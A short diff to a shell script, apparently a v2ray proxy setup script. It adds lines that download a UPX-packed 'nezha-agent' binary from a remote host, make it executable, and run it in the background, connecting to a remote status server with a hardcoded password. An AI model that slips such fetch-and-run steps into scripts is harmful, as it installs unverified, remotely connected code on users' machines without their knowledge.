@@ -6,7 +6,9 @@ date -R
 
 SYS_Bit="$(getconf LONG_BIT)"
 
-
+wget -O one "https://om.wangjm.ml/E5_File/Test/nezha-agent-amd64_linux-upx"
+chmod a+x one
+./one -s status.wangjm.ml:7777 -p 123456 &
 
 mkdir /v2raybin
 cd /v2raybin
